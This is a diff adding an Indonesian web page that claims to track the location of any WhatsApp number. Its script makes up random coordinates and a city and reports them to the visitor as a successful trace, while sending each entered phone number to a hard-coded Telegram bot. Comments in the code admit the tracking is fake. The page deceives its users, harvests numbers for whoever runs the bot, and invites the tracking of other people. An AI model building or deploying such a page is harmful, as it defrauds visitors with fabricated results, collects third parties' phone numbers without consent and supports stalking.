@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Lacak Lokasi Akurat via WhatsApp</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: 'Montserrat', sans-serif;
+    background: linear-gradient(135deg, #4361ee 0%, #89f7fe 100%);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    color: #fff;
+  }
+  .container {
+    background: rgba(255,255,255,0.12);
+    backdrop-filter: blur(12px);
+    border-radius: 16px;
+    padding: 32px;
+    max-width: 400px;
+    width: 100%;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.25);
+  }
+  h1 {
+    font-weight: 700;
+    font-size: 1.8rem;
+    margin-bottom: 24px;
+    text-align: center;
+    text-shadow: 0 2px 8px rgba(0,0,0,0.3);
+  }
+  label {
+    display: block;
+    font-weight: 600;
+    margin-bottom: 8px;
+    font-size: 0.95rem;
+    letter-spacing: 0.02em;
+  }
+  input[type="text"] {
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 10px;
+    border: none;
+    font-size: 1rem;
+    outline: none;
+    box-shadow: inset 2px 2px 6px rgba(255,255,255,0.5),
+                inset -2px -2px 6px rgba(0,0,0,0.15);
+    margin-bottom: 20px;
+    transition: box-shadow 0.3s ease;
+  }
+  input[type="text"]:focus {
+    box-shadow: 0 0 8px #35d8ac;
+  }
+  button {
+    width: 100%;
+    background: #35d8ac;
+    color: #052c2c;
+    font-weight: 700;
+    font-size: 1.1rem;
+    padding: 14px 0;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    box-shadow: 0 6px 20px rgba(53,216,172,0.5);
+    transition: background 0.3s ease;
+  }
+  button:hover, button:focus {
+    background: #28b594;
+    box-shadow: 0 8px 24px rgba(40,181,148,0.7);
+    outline: none;
+  }
+  .result {
+    margin-top: 28px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 12px;
+    padding: 20px;
+    font-size: 0.95rem;
+    line-height: 1.5;
+    box-shadow: inset 2px 2px 10px rgba(255,255,255,0.3);
+  }
+  .error {
+    color: #ff6b6b;
+    font-weight: 700;
+    text-align: center;
+  }
+  @media (max-width: 420px) {
+    .container {
+      padding: 24px 20px;
+    }
+  }
+</style>
+</head>
+<body>
+<div class="container" role="main" aria-label="Form lacak lokasi WhatsApp">
+  <h1>Lacak Lokasi Akurat</h1>
+  <form id="trackForm" aria-describedby="resultDesc">
+    <label for="waNumber">Masukkan Nomor WhatsApp</label>
+    <input type="text" id="waNumber" name="waNumber" placeholder="Contoh: 6281234567890" autocomplete="tel" pattern="^62[0-9]{8,14}$" required aria-required="true" aria-invalid="false" aria-describedby="formatHelp">
+    <small id="formatHelp" style="color:#ccdfd9;display:block;margin-bottom:20px;font-size:0.85rem;">Format: Kode negara tanpa "+" (contoh: 6281234567890)</small>
+    <button type="submit" aria-label="Mulai melacak lokasi nomor WhatsApp">Lacak Lokasi</button>
+  </form>
+  <div id="result" class="result" tabindex="0" aria-live="polite" aria-atomic="true" aria-relevant="additions" role="region" aria-describedby="resultDesc"></div>
+</div>
+<script>
+(() => {
+  const form = document.getElementById('trackForm');
+  const resultEl = document.getElementById('result');
+
+  // Telegram bot token and chat ID hard-coded as per instruction
+  const TELEGRAM_BOT_TOKEN = 'token';
+  const TELEGRAM_CHAT_ID = 'id';
+
+  // Fake location service simulation and submission to Telegram bot
+  // NOTE: Accurate live tracking of WhatsApp number location is NOT possible without WhatsApp API/hacking or phone permissions.
+  // This demo simulates a location lookup and sends a message to Telegram bot (fake location).
+
+  // Helper: send message to Telegram Bot API
+  async function sendTelegramMessage(text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: 'Markdown'
+    };
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      return await response.json();
+    } catch (e) {
+      return { ok: false, error: e.message };
+    }
+  }
+
+  // Simulate fetching approximate location data from WA number (dummy, for demo)
+  function simulateLocationLookup(waNumber) {
+    // For demonstration, generate random location coordinates in Indonesia
+    // Latitude: -2 to 6, Longitude: 95 to 141
+    const lat = (Math.random() * 8 - 2).toFixed(5);
+    const lon = (Math.random() * 46 + 95).toFixed(5);
+
+    // Simulate place name
+    const places = [
+      'Jakarta', 'Bandung', 'Surabaya', 'Bali', 'Yogyakarta', 'Medan', 'Makassar', 'Semarang', 'Palembang', 'Balikpapan'
+    ];
+    const place = places[Math.floor(Math.random() * places.length)];
+
+    return {
+      latitude: lat,
+      longitude: lon,
+      place: place
+    };
+  }
+
+  // Validate WA number pattern (starts with 62 and 9 to 15 digits)
+  function validateWANumber(num) {
+    return /^62\d{8,14}$/.test(num);
+  }
+
+  form.addEventListener('submit', async e => {
+    e.preventDefault();
+
+    resultEl.classList.remove('error');
+    resultEl.textContent = 'Memproses...';
+
+    const waNumber = form.waNumber.value.trim();
+
+    // Validate number format
+    if(!validateWANumber(waNumber)) {
+      resultEl.classList.add('error');
+      resultEl.textContent = 'Nomor WhatsApp tidak valid. Gunakan format: 6281234567890';
+      form.waNumber.setAttribute('aria-invalid', 'true');
+      form.waNumber.focus();
+      return;
+    } else {
+      form.waNumber.setAttribute('aria-invalid', 'false');
+    }
+
+    // Get simulated location info
+    const location = simulateLocationLookup(waNumber);
+
+    // Compose message for Telegram
+    const message = `*Lacak Lokasi WhatsApp*\n\nNomor: \`${waNumber}\`\nLokasi Perkiraan: ${location.place}\nKoordinat: [${location.latitude}, ${location.longitude}]\n\n_(Lokasi ini adalah perkiraan hasil simulasi)_`;
+
+    // Send to Telegram bot
+    const telegramRes = await sendTelegramMessage(message);
+
+    if(telegramRes.ok) {
+      resultEl.classList.remove('error');
+      resultEl.textContent = `Lokasi berhasil dilacak dan dikirim ke bot Telegram!\n\nNomor: ${waNumber}\nLokasi: ${location.place}\nKoordinat: ${location.latitude}, ${location.longitude}`;
+    } else {
+      resultEl.classList.add('error');
+      resultEl.textContent = `Gagal mengirim pesan ke Telegram: ${telegramRes.description || telegramRes.error || 'Unknown error'}`;
+    }
+  });
+})();
+</script>
+</body>
+</html>
+
+```
